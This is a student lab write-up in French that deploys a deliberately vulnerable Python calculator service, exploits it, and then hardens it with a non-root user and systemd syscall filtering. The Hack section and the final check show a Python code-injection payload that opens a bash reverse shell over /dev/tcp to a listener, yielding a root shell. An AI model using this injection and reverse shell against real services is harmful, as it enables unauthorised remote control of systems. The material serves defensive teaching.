# Part IV : My shitty app

## 1. Test

🌞 **Téléchargez l'app Python dans votre VM**

- avec une commande `curl` par exemple
- stockez le fichier `calc.py` dans le répertoire `/opt/`
```
[dash@localhost ~]$ sudo curl https://gitlab.com/it4lik/m1-hardening-2024/-/raw/main/tp/2/calc.py -o /opt/calc.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   780  100   780    0     0   5000      0 --:--:-- --:--:-- --:--:--  5000

```

🌞 **Lancer l'application dans votre VM**

- lancez-la avec : `python3 /opt/calc.py`
- ouvrez le bon port firewall
- connectez-vous avec une commande `nc` (depuis votre PC)
- essayez d'envoyer genre "3+3" une fois connecté
- l'app doit vous répondre "6"
```
[dash@localhost ~]$ sudo firewall-cmd --add-port=13337/tcp --permanent
[sudo] password for dash: 
success
[dash@localhost ~]$ sudo firewall-cmd --reload
success
[dash@localhost ~]$ sudo python3 /opt/calc.py 


```  
Sur le shell de ma machine
```
┌─[dashboard@parrot]─[~]
└──╼ $nc 192.168.133.129 13337

Hello3+3
6

```

## 2. Création de service

🌞 **Créer un service `calculatrice.service`**

```
[dash@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
```

🌞 **Indiquer à systemd que vous avez modifié les services**

```
[dash@localhost ~]$ sudo systemctl daemon-reload
```

🌞 **Vérifier que ce nouveau service est bien reconnu***

```
[dash@localhost ~]$ systemctl status calculatrice
○ calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: inactive (dead)
```

🌞 **Vous devez pouvoir utiliser l'application normalement :**

- démarrage de l'application avec `sudo systemctl start calculatrice`
```
[dash@localhost ~]$ sudo systemctl start calculatrice
```

## 3. Hack

🌞 **Hack l'application**

- depuis votre PC, vous vous connectez à l'application Python avec `nc`
```
┌─[✗]─[dashboard@parrot]─[~]
└──╼ $nc 192.168.133.129 13337

Hello__import__('os').system("bash -c 'bash -i >& /dev/tcp/192.168.133.128/4444 0>&1'")

```

- exploitez l'application pour obtenir un shell `root`  
```
┌─[dashboard@parrot]─[~]
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.133.128] from (UNKNOWN) [192.168.133.129] 45234
bash: cannot set terminal process group (302520): Inappropriate ioctl for device
bash: no job control in this shell
[root@localhost /]# ls
ls
afs
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
[root@localhost /]# 

```

## 4. Harden

### A. Utilisateurs

🌞 **Prouvez que le service s'exécute actuellement en `root`**

```
[dash@localhost ~]$ ps -ef | grep calc.py
root      342939       1  0 15:29 ?        00:00:00 /usr/bin/python3 /opt/calc.py
dash      344690   10782  0 15:30 pts/0    00:00:00 grep --color=auto calc.py

```

🌞 **Créer l'utilisateur `calculatrice`**

- principe du moindre privilège :
```
[dash@localhost ~]$ sudo useradd -M -N -s /sbin/nologin calculatrice
```

🌞 **Adaptez les permissions**

- le fichier `/opt/calc.py` doit appartenir à notre nouvel utilisateur
- le fichier `/opt/calc.py` doit appartenir à notre nouveau groupe
- les permissions doivent être les plus restrictives possibles pour que le service fonctionne
```
[dash@localhost ~]$ sudo chown calculatrice:calculatrice /opt/calc.py 
[dash@localhost ~]$ ls -l /opt/calc.py 
-rwxr-x---. 1 calculatrice calculatrice 780 Feb 11 14:01 /opt/calc.py

```

🌞 **Modifier le `.service`**

- ajoutez la clause `User=calculatrice`
- n'oubliez pas de `sudo systemctl daemon-reload` pour que le changement prenne effet
- redémarrez le service
```
[dash@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
User=calculatrice
[dash@localhost ~]$ sudo systemctl daemon-reload
[dash@localhost ~]$ sudo systemctl restart calculatrice

```

🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**

- avec une commande `ps` et un `grep`
```
[dash@localhost ~]$ ps -ef | grep calc.py
calcula+  389956       1  1 15:53 ?        00:00:00 /usr/bin/python3 /opt/calc.py
dash      390043   10782  0 15:53 pts/0    00:00:00 grep --color=auto calc.py

```

### B. Syscalls


🌞 **Tracez l'exécution de l'application : normal**

- effectuez un tracing avec `strace` ou `sysdig`
- donnez dans le compte-rendu la liste des syscalls effectués par l'application `calc.py` pendant son fonctionnement normal
```
[dash@localhost ~]$ sudo sysdig proc.name=python3 > normal_trace.log
[sudo] password for dash: 
[dash@localhost ~]$ sudo cat normal_trace.log | cut -d' ' -f7 | sort | uniq | tr '\n' ' '
accept4 access arch_prctl bind brk close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address socket switch sysinfo write
```

🌞 **Tracez l'exécution de l'application : hack**

- idem, mais pendant que vous exploitez la vulnérabilité

```
[dash@localhost ~]$ sudo cat hack_trace.log | cut -d' ' -f7 | sort | uniq | tr '\n' ' '
accept4 clone3 execve getsockname mmap munmap recvfrom rt_sigaction rt_sigprocmask sendto switch wait4 [dash@localhost ~]$
```
- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?
Oui. `clone3`, `rt_sigprocmask` et `wait4`  

🌞 **Adaptez le `.service`**

- ajoutez un filtrage des *syscalls* dans le fichier `calculatrice.service`

```
[dash@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
SystemCallFilter=~clone3 rt_sigprocmask wait4
[dash@localhost ~]$ sudo systemctl daemon-reload
[dash@localhost ~]$ sudo systemctl restart calculatrice

```
- vérifiez que l'exploitation est devenue plus compliquée
```
┌─[dashboard@parrot]─[~]
└──╼ $nc 192.168.133.129 13337

Hello__import__('os').system("bash -c 'bash -i >& /dev/tcp/192.168.133.128/4444 0>&1'")
┌─[dashboard@parrot]─[~]
└──╼ $
```
